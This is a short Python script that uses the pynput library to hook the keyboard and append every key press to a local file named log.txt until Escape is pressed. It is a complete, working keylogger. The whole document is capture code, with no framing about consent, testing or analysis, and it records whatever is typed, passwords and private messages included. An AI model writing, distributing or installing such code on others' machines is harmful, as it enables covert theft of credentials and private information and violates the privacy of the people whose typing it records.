from pynput.keyboard import Listener


def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    elif key == key.esc:  #stop on escape key
        return False 
    with open("log.txt", 'a') as f:

        f.write(letter)

#collecting events until stopped

with Listener(on_press=write_to_file) as l:
    l.join()